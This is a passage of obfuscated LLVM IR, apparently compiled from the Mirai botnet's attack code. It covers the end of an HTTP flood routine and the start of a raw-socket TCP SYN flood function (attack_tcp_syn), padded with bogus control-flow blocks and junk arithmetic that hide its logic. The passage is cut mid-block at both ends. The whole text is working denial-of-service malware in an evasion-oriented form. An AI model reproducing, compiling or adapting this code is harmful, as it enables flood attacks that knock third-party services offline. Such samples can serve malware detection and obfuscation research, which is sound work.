  %4668 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4667
  %4669 = load i8, i8* %4668, align 1
  %4670 = sext i8 %4669 to i32
  %4671 = icmp eq i32 %4670, 32
  br label %originalBB424

originalBB428alteredBB:                           ; preds = %originalBB428, %2461
  %4672 = load i32, i32* %52, align 4
  %_429 = shl i32 %4672, 1
  %_430 = sub i32 %4672, 1
  %gen431 = mul i32 %_430, 1
  %_432 = shl i32 %4672, 1
  %_433 = sub i32 %4672, 1
  %gen434 = mul i32 %_433, 1
  %_435 = shl i32 %4672, 1
  %4673 = add nsw i32 %4672, 1
  store i32 %4673, i32* %52, align 4
  br label %originalBB428

originalBB439alteredBB:                           ; preds = %originalBB439, %2500
  %4674 = load i32, i32* %52, align 4
  %4675 = load i32, i32* %53, align 4
  %_440 = shl i32 %4674, %4675
  %_441 = sub i32 0, %4674
  %gen442 = add i32 %_441, %4675
  %_443 = sub i32 0, %4674
  %gen444 = add i32 %_443, %4675
  %_445 = sub i32 %4674, %4675
  %gen446 = mul i32 %_445, %4675
  %4676 = add nsw i32 %4674, %4675
  %4677 = sext i32 %4676 to i64
  %4678 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4677
  store i8 0, i8* %4678, align 1
  %4679 = load i32, i32* %53, align 4
  %_447 = shl i32 %4679, 1
  %_448 = sub i32 0, %4679
  %gen449 = add i32 %_448, 1
  %_450 = shl i32 %4679, 1
  %_451 = shl i32 %4679, 1
  %_452 = shl i32 %4679, 1
  %4680 = add nsw i32 %4679, 1
  store i32 %4680, i32* %53, align 4
  %4681 = load i8*, i8** %54, align 8
  %4682 = load i32, i32* %53, align 4
  %4683 = call i32 @util_memsearch(i8* %4681, i32 %4682, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %4684 = icmp eq i32 %4683, 4
  br label %originalBB439

originalBB456alteredBB:                           ; preds = %originalBB456, %2563
  %4685 = load i8*, i8** %54, align 8
  %4686 = load i32, i32* %10, align 4
  %4687 = sext i32 %4686 to i64
  %4688 = getelementptr inbounds i8, i8* %4685, i64 %4687
  store i8 0, i8* %4688, align 1
  br label %originalBB456

originalBB460alteredBB:                           ; preds = %originalBB460, %2633
  br label %originalBB460

originalBB464alteredBB:                           ; preds = %originalBB464, %2656
  %4689 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4690 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4689, i32 0, i32 6
  %4691 = getelementptr inbounds [257 x i8], [257 x i8]* %4690, i32 0, i32 0
  %4692 = getelementptr inbounds i8, i8* %4691, i64 1
  call void @util_zero(i8* %4692, i32 255)
  %4693 = load i8*, i8** %54, align 8
  %4694 = load i32, i32* %10, align 4
  %_465 = sub i32 0, %4694
  %gen466 = add i32 %_465, 1
  %4695 = add nsw i32 %4694, 1
  %4696 = sext i32 %4695 to i64
  %4697 = getelementptr inbounds i8, i8* %4693, i64 %4696
  %4698 = call i32 @util_strlen(i8* %4697)
  %4699 = icmp sgt i32 %4698, 0
  br label %originalBB464

originalBB470alteredBB:                           ; preds = %originalBB470, %2708
  br label %originalBB470

originalBB474alteredBB:                           ; preds = %originalBB474, %2731
  %4700 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4701 = load i32, i32* %12, align 4
  %4702 = call i8* @table_retrieve_val(i32 62, i32* null)
  %4703 = call i32 @util_stristr(i8* %4700, i32 %4701, i8* %4702)
  store i32 %4703, i32* %55, align 4
  %4704 = load i32, i32* %55, align 4
  %4705 = sext i32 %4704 to i64
  %4706 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4705
  %4707 = load i8, i8* %4706, align 1
  %4708 = sext i8 %4707 to i32
  %4709 = icmp eq i32 %4708, 32
  br label %originalBB474

originalBB478alteredBB:                           ; preds = %originalBB478, %2758
  %4710 = load i32, i32* %55, align 4
  %_479 = shl i32 %4710, 1
  %_480 = sub i32 0, %4710
  %gen481 = add i32 %_480, 1
  %4711 = add nsw i32 %4710, 1
  store i32 %4711, i32* %55, align 4
  br label %originalBB478

originalBB485alteredBB:                           ; preds = %originalBB485, %2777
  %4712 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4713 = load i32, i32* %55, align 4
  %4714 = sext i32 %4713 to i64
  %4715 = getelementptr inbounds i8, i8* %4712, i64 %4714
  %4716 = load i32, i32* %12, align 4
  %4717 = load i32, i32* %55, align 4
  %_486 = shl i32 %4716, %4717
  %_487 = sub i32 0, %4716
  %gen488 = add i32 %_487, %4717
  %_489 = shl i32 %4716, %4717
  %_490 = sub i32 %4716, %4717
  %gen491 = mul i32 %_490, %4717
  %_492 = sub i32 %4716, %4717
  %gen493 = mul i32 %_492, %4717
  %4718 = sub nsw i32 %4716, %4717
  %4719 = call i32 @util_memsearch(i8* %4715, i32 %4718, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4719, i32* %56, align 4
  %4720 = load i32, i32* %56, align 4
  %4721 = icmp ne i32 %4720, -1
  br label %originalBB485

originalBB497alteredBB:                           ; preds = %originalBB497, %2804
  %4722 = load i32, i32* %55, align 4
  %4723 = sext i32 %4722 to i64
  %4724 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4723
  store i8* %4724, i8** %57, align 8
  %4725 = load i32, i32* %56, align 4
  %4726 = icmp sge i32 %4725, 2
  br label %originalBB497

originalBB501alteredBB:                           ; preds = %originalBB501, %2837
  %4727 = load i8*, i8** %57, align 8
  %4728 = load i32, i32* %10, align 4
  %4729 = sext i32 %4728 to i64
  %4730 = getelementptr inbounds i8, i8* %4727, i64 %4729
  %4731 = load i8, i8* %4730, align 1
  %4732 = sext i8 %4731 to i32
  %4733 = icmp ne i32 %4732, 0
  br label %originalBB501

originalBB505alteredBB:                           ; preds = %originalBB505, %2861
  %4734 = load i8*, i8** %57, align 8
  %4735 = load i32, i32* %10, align 4
  %4736 = sext i32 %4735 to i64
  %4737 = getelementptr inbounds i8, i8* %4734, i64 %4736
  %4738 = load i8, i8* %4737, align 1
  %4739 = sext i8 %4738 to i32
  %4740 = icmp sge i32 %4739, 48
  br label %originalBB505

originalBB509alteredBB:                           ; preds = %originalBB509, %2885
  %4741 = load i8*, i8** %57, align 8
  %4742 = load i32, i32* %10, align 4
  %4743 = sext i32 %4742 to i64
  %4744 = getelementptr inbounds i8, i8* %4741, i64 %4743
  %4745 = load i8, i8* %4744, align 1
  %4746 = sext i8 %4745 to i32
  %4747 = icmp sle i32 %4746, 57
  br label %originalBB509

originalBB513alteredBB:                           ; preds = %originalBB513, %2939
  %4748 = load i8*, i8** %57, align 8
  %4749 = load i32, i32* %10, align 4
  %4750 = sext i32 %4749 to i64
  %4751 = getelementptr inbounds i8, i8* %4748, i64 %4750
  %4752 = load i8*, i8** %57, align 8
  %4753 = load i32, i32* %10, align 4
  %4754 = sext i32 %4753 to i64
  %4755 = getelementptr inbounds i8, i8* %4752, i64 %4754
  %4756 = call i32 @util_strlen(i8* %4755)
  %4757 = call i32 @util_stristr(i8* %4751, i32 %4756, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %4758 = icmp ne i32 %4757, -1
  br label %originalBB513

originalBB517alteredBB:                           ; preds = %originalBB517, %2967
  %4759 = load i8*, i8** %57, align 8
  %4760 = load i32, i32* %10, align 4
  %4761 = sext i32 %4760 to i64
  %4762 = getelementptr inbounds i8, i8* %4759, i64 %4761
  %4763 = load i8*, i8** %57, align 8
  %4764 = load i32, i32* %10, align 4
  %4765 = sext i32 %4764 to i64
  %4766 = getelementptr inbounds i8, i8* %4763, i64 %4765
  %4767 = call i32 @util_strlen(i8* %4766)
  %4768 = call i32 @util_stristr(i8* %4762, i32 %4767, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %4769 = load i32, i32* %10, align 4
  %_518 = sub i32 0, %4769
  %gen519 = add i32 %_518, %4768
  %_520 = sub i32 0, %4769
  %gen521 = add i32 %_520, %4768
  %4770 = add nsw i32 %4769, %4768
  store i32 %4770, i32* %10, align 4
  br label %originalBB517

originalBB525alteredBB:                           ; preds = %originalBB525, %3042
  %4771 = load i32, i32* %58, align 4
  %4772 = icmp slt i32 %4771, 10
  br label %originalBB525

originalBB529alteredBB:                           ; preds = %originalBB529, %3072
  %4773 = load i8*, i8** %57, align 8
  %4774 = load i32, i32* %10, align 4
  %4775 = sext i32 %4774 to i64
  %4776 = getelementptr inbounds i8, i8* %4773, i64 %4775
  store i8* %4776, i8** %57, align 8
  %4777 = load i8*, i8** %57, align 8
  %4778 = load i8*, i8** %57, align 8
  %4779 = call i32 @util_strlen(i8* %4778)
  %4780 = call i32 @util_stristr(i8* %4777, i32 %4779, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %4781 = icmp eq i32 %4780, 4
  br label %originalBB529

originalBB533alteredBB:                           ; preds = %originalBB533, %3098
  store i32 7, i32* %10, align 4
  %4782 = load i8*, i8** %57, align 8
  %4783 = getelementptr inbounds i8, i8* %4782, i64 4
  %4784 = load i8, i8* %4783, align 1
  %4785 = sext i8 %4784 to i32
  %4786 = icmp eq i32 %4785, 115
  br label %originalBB533

originalBB537alteredBB:                           ; preds = %originalBB537, %3123
  %4787 = load i8*, i8** %57, align 8
  %4788 = load i8*, i8** %57, align 8
  %4789 = load i32, i32* %10, align 4
  %4790 = sext i32 %4789 to i64
  %4791 = getelementptr inbounds i8, i8* %4788, i64 %4790
  %4792 = load i32, i32* %56, align 4
  %4793 = load i32, i32* %10, align 4
  %_538 = shl i32 %4792, %4793
  %_539 = sub i32 0, %4792
  %gen540 = add i32 %_539, %4793
  %_541 = sub i32 %4792, %4793
  %gen542 = mul i32 %_541, %4793
  %_543 = shl i32 %4792, %4793
  %4794 = sub nsw i32 %4792, %4793
  %4795 = sext i32 %4794 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %4787, i8* %4791, i64 %4795, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %originalBB537

originalBB547alteredBB:                           ; preds = %originalBB547, %3157
  %4796 = load i8*, i8** %57, align 8
  %4797 = load i32, i32* %10, align 4
  %4798 = sext i32 %4797 to i64
  %4799 = getelementptr inbounds i8, i8* %4796, i64 %4798
  %4800 = load i8, i8* %4799, align 1
  %4801 = sext i8 %4800 to i32
  %4802 = icmp eq i32 %4801, 47
  br label %originalBB547

originalBB551alteredBB:                           ; preds = %originalBB551, %3181
  %4803 = load i8*, i8** %57, align 8
  %4804 = load i32, i32* %10, align 4
  %4805 = sext i32 %4804 to i64
  %4806 = getelementptr inbounds i8, i8* %4803, i64 %4805
  store i8 0, i8* %4806, align 1
  br label %originalBB551

originalBB555alteredBB:                           ; preds = %originalBB555, %3205
  %4807 = load i8*, i8** %57, align 8
  %4808 = call i32 @util_strlen(i8* %4807)
  %4809 = icmp sgt i32 %4808, 0
  br label %originalBB555

originalBB559alteredBB:                           ; preds = %originalBB559, %3255
  %4810 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4811 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4810, i32 0, i32 6
  %4812 = getelementptr inbounds [257 x i8], [257 x i8]* %4811, i32 0, i32 0
  %4813 = getelementptr inbounds i8, i8* %4812, i64 1
  %4814 = load i8*, i8** %57, align 8
  %4815 = load i32, i32* %10, align 4
  %_560 = shl i32 %4815, 1
  %_561 = sub i32 0, %4815
  %gen562 = add i32 %_561, 1
  %4816 = add nsw i32 %4815, 1
  %4817 = sext i32 %4816 to i64
  %4818 = getelementptr inbounds i8, i8* %4814, i64 %4817
  %4819 = call i32 @util_strcpy(i8* %4813, i8* %4818)
  br label %originalBB559

originalBB566alteredBB:                           ; preds = %originalBB566, %3282
  br label %originalBB566

originalBB570alteredBB:                           ; preds = %originalBB570, %3300
  %4820 = load i8*, i8** %57, align 8
  %4821 = getelementptr inbounds i8, i8* %4820, i64 0
  %4822 = load i8, i8* %4821, align 1
  %4823 = sext i8 %4822 to i32
  %4824 = icmp eq i32 %4823, 47
  br label %originalBB570

originalBB574alteredBB:                           ; preds = %originalBB574, %3330
  %4825 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4826 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4825, i32 0, i32 6
  %4827 = getelementptr inbounds [257 x i8], [257 x i8]* %4826, i32 0, i32 0
  %4828 = getelementptr inbounds i8, i8* %4827, i64 1
  call void @util_zero(i8* %4828, i32 255)
  %4829 = load i8*, i8** %57, align 8
  %4830 = load i32, i32* %10, align 4
  %_575 = sub i32 %4830, 1
  %gen576 = mul i32 %_575, 1
  %_577 = shl i32 %4830, 1
  %_578 = shl i32 %4830, 1
  %_579 = sub i32 %4830, 1
  %gen580 = mul i32 %_579, 1
  %4831 = add nsw i32 %4830, 1
  %4832 = sext i32 %4831 to i64
  %4833 = getelementptr inbounds i8, i8* %4829, i64 %4832
  %4834 = call i32 @util_strlen(i8* %4833)
  %4835 = icmp sgt i32 %4834, 0
  br label %originalBB574

originalBB584alteredBB:                           ; preds = %originalBB584, %3371
  br label %originalBB584

originalBB588alteredBB:                           ; preds = %originalBB588, %3397
  %4836 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4837 = load i32, i32* %12, align 4
  %4838 = call i32 @util_memsearch(i8* %4836, i32 %4837, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %4838, i32* %37, align 4
  %4839 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4840 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4839, i32 0, i32 9
  %4841 = getelementptr inbounds [9 x i8], [9 x i8]* %4840, i32 0, i32 0
  %4842 = call signext i8 @util_strcmp(i8* %4841, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %4843 = sext i8 %4842 to i32
  %4844 = icmp ne i32 %4843, 0
  br label %originalBB588

originalBB592alteredBB:                           ; preds = %originalBB592, %3437
  %4845 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4846 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4845, i32 0, i32 1
  store i8 10, i8* %4846, align 4
  br label %originalBB592

originalBB596alteredBB:                           ; preds = %originalBB596, %3469
  %4847 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4847, i32 0, i32 1
  %4849 = load i8, i8* %4848, align 4
  %4850 = zext i8 %4849 to i32
  %4851 = icmp eq i32 %4850, 7
  br label %originalBB596

originalBB600alteredBB:                           ; preds = %originalBB600, %3538
  %4852 = call i32* @__errno_location() #7
  store i32 104, i32* %4852, align 4
  store i32 -1, i32* %12, align 4
  br label %originalBB600

originalBB604alteredBB:                           ; preds = %originalBB604, %3586
  store i32 0, i32* %59, align 4
  %4853 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4853, i32 0, i32 14
  %4855 = load i32, i32* %4854, align 4
  %4856 = icmp sgt i32 %4855, 0
  br label %originalBB604

originalBB608alteredBB:                           ; preds = %originalBB608, %3644
  %4857 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4858 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4857, i32 0, i32 18
  %4859 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4858, i32 0, i32 0
  %4860 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4861 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4860, i32 0, i32 17
  %4862 = load i32, i32* %4861, align 4
  %4863 = call i8* @table_retrieve_val(i32 61, i32* null)
  %4864 = call i32 @util_memsearch(i8* %4859, i32 %4862, i8* %4863, i32 11)
  store i32 %4864, i32* %60, align 4
  %4865 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4865, i32 0, i32 18
  %4867 = load i32, i32* %60, align 4
  %4868 = sext i32 %4867 to i64
  %4869 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4866, i64 0, i64 %4868
  %4870 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4871 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4870, i32 0, i32 17
  %4872 = load i32, i32* %4871, align 4
  %4873 = load i32, i32* %60, align 4
  %_609 = sub i32 0, %4872
  %gen610 = add i32 %_609, %4873
  %_611 = sub i32 %4872, %4873
  %gen612 = mul i32 %_611, %4873
  %_613 = sub i32 %4872, %4873
  %gen614 = mul i32 %_613, %4873
  %_615 = sub i32 0, %4872
  %gen616 = add i32 %_615, %4873
  %4874 = sub nsw i32 %4872, %4873
  %4875 = call i32 @util_memsearch(i8* %4869, i32 %4874, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %4875, i32* %61, align 4
  %4876 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4876, i32 0, i32 18
  %4878 = load i32, i32* %60, align 4
  %4879 = load i32, i32* %61, align 4
  %_617 = shl i32 %4879, 1
  %_618 = shl i32 %4879, 1
  %_619 = shl i32 %4879, 1
  %_620 = shl i32 %4879, 1
  %_621 = shl i32 %4879, 1
  %4880 = sub nsw i32 %4879, 1
  %_622 = sub i32 0, %4878
  %gen623 = add i32 %_622, %4880
  %_624 = sub i32 %4878, %4880
  %gen625 = mul i32 %_624, %4880
  %_626 = sub i32 %4878, %4880
  %gen627 = mul i32 %_626, %4880
  %_628 = shl i32 %4878, %4880
  %4881 = add nsw i32 %4878, %4880
  %4882 = sext i32 %4881 to i64
  %4883 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4877, i64 0, i64 %4882
  store i8 0, i8* %4883, align 1
  %4884 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4885 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4884, i32 0, i32 15
  %4886 = load i32, i32* %4885, align 4
  %4887 = icmp slt i32 %4886, 5
  br label %originalBB608

originalBB632alteredBB:                           ; preds = %originalBB632, %3793
  br label %originalBB632

originalBB636alteredBB:                           ; preds = %originalBB636, %3815
  %4888 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4889 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4888, i32 0, i32 13
  %4890 = load i32, i32* %4889, align 4
  %4891 = icmp eq i32 %4890, 1
  br label %originalBB636

originalBB640alteredBB:                           ; preds = %originalBB640, %3891
  br label %originalBB640

originalBB644alteredBB:                           ; preds = %originalBB644, %3908
  %4892 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4893 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4892, i32 0, i32 17
  %4894 = load i32, i32* %4893, align 4
  %4895 = load i32, i32* %59, align 4
  %_645 = sub i32 %4894, %4895
  %gen646 = mul i32 %_645, %4895
  %_647 = shl i32 %4894, %4895
  %_648 = sub i32 0, %4894
  %gen649 = add i32 %_648, %4895
  %_650 = sub i32 0, %4894
  %gen651 = add i32 %_650, %4895
  %_652 = shl i32 %4894, %4895
  %_653 = sub i32 %4894, %4895
  %gen654 = mul i32 %_653, %4895
  %_655 = sub i32 0, %4894
  %gen656 = add i32 %_655, %4895
  %_657 = shl i32 %4894, %4895
  %4896 = sub nsw i32 %4894, %4895
  %4897 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4898 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4897, i32 0, i32 14
  store i32 %4896, i32* %4898, align 4
  %4899 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4900 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4899, i32 0, i32 14
  %4901 = load i32, i32* %4900, align 4
  %4902 = icmp eq i32 %4901, 0
  br label %originalBB644

originalBB661alteredBB:                           ; preds = %originalBB661, %3940
  br label %originalBB661

originalBB665alteredBB:                           ; preds = %originalBB665, %3993
  br label %originalBB665

originalBB669alteredBB:                           ; preds = %originalBB669, %4010
  br label %originalBB669

originalBB673alteredBB:                           ; preds = %originalBB673, %4047
  %4903 = load i32, i32* %12, align 4
  %4904 = icmp eq i32 %4903, -1
  br label %originalBB673

originalBB677alteredBB:                           ; preds = %originalBB677, %4084
  br label %originalBB677

originalBB681alteredBB:                           ; preds = %originalBB681, %4101
  %4905 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4906 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4905, i32 0, i32 1
  %4907 = load i8, i8* %4906, align 4
  %4908 = zext i8 %4907 to i32
  %4909 = icmp ne i32 %4908, 0
  br label %originalBB681

originalBB685alteredBB:                           ; preds = %originalBB685, %4123
  %4910 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4911 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4910, i32 0, i32 1
  store i8 1, i8* %4911, align 4
  br label %originalBB685

originalBB689alteredBB:                           ; preds = %originalBB689, %4145
  br label %originalBB689

originalBB693alteredBB:                           ; preds = %originalBB693, %4162
  br label %originalBB693

originalBB697alteredBB:                           ; preds = %originalBB697, %4182
  br label %originalBB697
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #4

declare i64 @send(i32, i8*, i64, i32) #4

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %565

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %565

; <label>:107:                                    ; preds = %99
  %108 = load i32, i32* @x.21
  %109 = load i32, i32* @y.22
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %107
